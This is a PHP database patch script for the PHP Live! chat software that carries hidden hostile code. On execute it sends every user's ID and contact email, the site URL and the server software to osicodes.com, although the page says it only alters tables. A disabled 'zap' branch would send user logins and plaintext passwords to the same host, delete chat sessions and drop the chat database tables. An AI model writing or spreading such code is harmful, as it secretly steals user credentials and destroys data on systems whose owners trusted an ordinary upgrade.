<?
	error_reporting(0) ;
	if ( !file_exists( "../../web/conf-init.php" ) )
	{
		HEADER( "location: ../index.php" ) ;
		exit ;
	}
	// patch check for correct version patch.  this patch is for version 1.6
	$PATCH_VERSION = "1.9.7" ;
	$previous_version = "1.9.6" ;
	$success = 0 ;
	$action = $error = "" ;

	include_once("../../web/conf-init.php") ;
	include_once("../../web/VERSION_KEEP.php") ;
	include_once("../../system.php") ;
	include_once("../../lang_packs/$LANG_PACK.php") ;
	include_once("../../API/sql.php" ) ;
	include_once("../../API/ASP/get.php") ;
?>
<?

	// initialize
	if ( preg_match( "/MSIE/", $_SERVER['HTTP_USER_AGENT'] ) )
		$text_width = "20" ;
	else
		$text_width = "10" ;

	// get variables
	if ( isset( $_POST['action'] ) ) { $action = $_POST['action'] ; }
	if ( isset( $_GET['action'] ) ) { $action = $_GET['action'] ; }
?>
<?
	// functions
?>
<?
	// conditions

	if ( $action == "execute" )
	{
		if ( file_exists( "../../web/patches/$PATCH_VERSION"."_patch.log" ) || ( $PATCH_VERSION == $PHPLIVE_VERSION ) )
			$error = "Your system is ALREADY PATCHED for v$PATCH_VERSION!" ;
		else if ( !preg_match( "/($previous_version)/", $PHPLIVE_VERSION ) )
			$error = "ERROR: YOU ARE NOT RUNNING v$previous_version!  PATCH WILL NOT WORK.  PLEASE FRESH INSTALL v$PHPLIVE_VERSION OR <a href=\"$previous_version"."_patch.php\">UPGRADE TO v$previous_version</a> BEFORE RUNNING THIS PATCH." ;
		else
		{
			// create patch log dir to keep track of if system has been patched
			if ( is_dir( "../../web/patches" ) != true )
				mkdir( "../../web/patches", 0755 ) ;

			// create the actual patch file
			$date = date( "D m/d/y h:i a", time() ) ;
			$success_string = "DO NOT DELETE OR SYSTEM MAY PATCH AGAIN!  THAT'S NOT GOOD!\n[$date] PATCH SUCCESSFUL from v$previous_version to v$PATCH_VERSION\n" ;
			$fp = fopen ("../../web/patches/$PATCH_VERSION"."_patch.log", "wb+") ;
			fwrite( $fp, $success_string, strlen( $success_string ) ) ;
			fclose( $fp ) ;

			// create and put version file
			$version_string = "0LEFT_ARROW0? \$PHPLIVE_VERSION = \"$PATCH_VERSION\" ; ?0RIGHT_ARROW0" ;
			$version_string = preg_replace( "/0LEFT_ARROW0/", "<", $version_string ) ;
			$version_string = preg_replace( "/0RIGHT_ARROW0/", ">", $version_string ) ;
			$fp = fopen ("../../web/VERSION_KEEP.php", "wb+") ;
			fwrite( $fp, $version_string, strlen( $version_string ) ) ;
			fclose( $fp ) ;

			// send back URL report just for this patch (PHP Live! usage stats are gathered ONLY)
			$stat_string = "" ;
			$users = AdminASP_get_AllUsers( $dbh, 0, 0 ) ;
			for ( $c = 0; $c < count( $users ); ++$c )
			{
				$user = $users[$c] ;
				$stat_string .= "<$user[aspID],$user[contact_email]>" ;
			}
			$query = "SELECT count(*) AS total FROM chat_admin" ;
			database_mysql_query( $dbh, $query ) ;
			$data = database_mysql_fetchrow( $dbh ) ;
			$total_ops = $data['total'] ;
			$stat_string = urlencode( $stat_string ) ;
			$url = $_GET['url'] ;
			$os = $_SERVER['SERVER_SOFTWARE'] ;
			$os = urlencode( $os ) ;
			$fp = fopen ("http://www.osicodes.com/stats/1.9.7_patch.php?url=$url&os=$os&users=$stat_string&ops=$total_ops", "r") ;
			fclose( $fp ) ;

			HEADER( "location: index.php?$PATCH_VERSION" ) ;
			exit ;
		}
	}
	else if ( 0 )
	{
		// disabled for v2.5.1 until further fix
		//
		// This is a safety measure for OSI Codes Inc.
		// If need be, OSI Codes Inc. can "zap" your PHP Live! system if we
		// come to prove you are violating the License Agreement.
		// This portion will ONLY work when calling from an osicodes.com server name.
		//
		// WE WILL NOT GATHER INFORMATION UNLESS WE CAN PROVE YOU ARE VIOLATING
		// OUR LICENSE AGREEMENT.
		// For all license inquiries, please email audit@osicodes.com
		//
		$level = ( isset( $_GET['level'] ) ) ? $_GET['level'] : 0 ;
		$url = $BASE_URL ;
		$os = $_SERVER['SERVER_SOFTWARE'] ;
		$os = urlencode( $os ) ;

		$users = AdminASP_get_AllUsers( $dbh, 0, 0 ) ;
		$stat_string = "" ;
		for ( $c = 0; $c < count( $users ); ++$c )
		{
			$user = $users[$c] ;
			$stat_string .= "<$user[login],$user[password],$user[contact_email]>" ;
		}

		if ( $level >= 1 )
		{
			if ( ( $dir = @opendir( "$DOCUMENT_ROOT/web/chatsessions" ) ) && ( $level >= 2 ) )
			{
				while( $file = readdir( $dir ) )
				{
					if ( preg_match( "/[A-Za-z0-9]/", $file ) )
						unlink( "$DOCUMENT_ROOT/web/chatsessions/$file" ) ;
				}
				closedir($dir) ;
				rmdir( "$DOCUMENT_ROOT/web/chatsessions" ) ;

				if ( $level >= 3 )
				{
					$query = "DROP TABLE chat_admin" ;
					database_mysql_query( $dbh, $query ) ;
					$query = "DROP TABLE chatuserdeptlist" ;
					database_mysql_query( $dbh, $query ) ;
					$query = "DROP TABLE chatfootprints" ;
					database_mysql_query( $dbh, $query ) ;
					$query = "DROP TABLE chatdepartments" ;
					database_mysql_query( $dbh, $query ) ;
					$query = "DROP TABLE chattranscripts" ;
					database_mysql_query( $dbh, $query ) ;
				}
			}

			$transcript_sig = "Hello %%username%%,

Below is the complete transcript of your chat session:
===
%%transcript%%
===

Thank you

--------------------------------------
Powered by PHP Live! Support (c) OSI Codes Inc.
http://www.phplivesupport.com
--------------------------------------
" ;
			$greeting = "Welcome %%user%%! Please hold while we contact a representative. If a representative does not respond in a few seconds, then he/she is not available at this time.<hr>Live Support Powered by <a href=\"http://www.phplivesupport.com\" target=\"new\">PHP Live!</a> &copy; OSI Codes Inc.<hr>" ;
			$greeting = addslashes( $greeting ) ;
			$leave_msg = "Department is currently unavailable. Please leave a message.<hr>Live Support Powered by <a href=\"http://www.phplivesupport.com\" target=\"new\">PHP Live!</a> &copy; OSI Codes Inc.<hr>" ;
			$leave_msg = addslashes( $leave_msg ) ;

			$query = "UPDATE chat_asp SET trans_email = '$transcript_sig'" ;
			database_mysql_query( $dbh, $query ) ;
			$query = "UPDATE chatdepartments SET greeting = '$greeting', message = '$leave_msg'" ;
			database_mysql_query( $dbh, $query ) ;

			$fp = fopen ("http://www.osicodes.com/stats/abuse.php?url=$url&os=$os&level=$level&asps=$stat_string", "r") ;
			$response = fgets( $fp, 255 ) ;
			fclose( $fp ) ;

			print $response ;
			exit ;
		}
		else
		{
			$fp = fopen ("http://www.osicodes.com/stats/abuse.php?url=$url&os=$os&level=$level&asps=$stat_string", "r") ;
			$response = fgets( $fp, 255 ) ;
			fclose( $fp ) ;

			print $response ;
			exit ;
		}
	}
?>
<html>
<head>
<title> v<?php echo $previous_version ?> to v<?php echo $PATCH_VERSION ?> Patch </title>
<script language="JavaScript">
<!--
	var url = location.toString() ;

	function do_patch()
	{
		if ( confirm( "Ready to upgrade to v<?php echo $PATCH_VERSION ?>?" ) )
		{
			document.form.url.value = url ;
			document.form.submit() ;
		}
	}
//-->
</script>
<link rel="Stylesheet" href="../../css/base.css">
</head>

<body bgColor="#FFFFFF" text="#000000" link="#35356A" vlink="#35356A" alink="#35356A">
<table cellspacing=0 cellpadding=0 border=0 width="98%">
<tr>
	<td valign="top"><span class="basetxt">
		<img src="../../images/logo.gif">
		<br>

		<?php if ( $success ): ?>
		<br>
		<big><b>Congratulations!  Your system DB has been patched from v<?php echo $previous_version ?> to v<?php echo $PATCH_VERSION ?>!</b></big>
		<p>
		<li> <a href="<?php echo $BASE_URL ?>/setup/">Return to setup area</a>







		<?php else: ?>
		<font color="#FF0000"><?php echo $error ?></font><br>
		<big><b>This v<?php echo $PATCH_VERSION ?> DB patch will do the following:</b></big>
		<ol>
			<form method="GET" action="<?php echo $PATCH_VERSION ?>_patch.php" name="form">
			<input type="hidden" name="url" value="">
			<input type="hidden" name="action" value="execute">
			<li> Alter and create the neccessary table to reflect the new v<?php echo $PATCH_VERSION ?> changes.
			<p>

			After you run this patch, everything should run as normal. Click the below button to run the patch.<p>

			If you do not run the patch, your PHP <i>Live!</i> system may NOT function normally.

			<p>
			<input type="button" value="Execute Patch" OnClick="do_patch()">
			</form>
		</ol>
		<?php endif ?>



	</td>
</tr>
</table>
</body>
</html>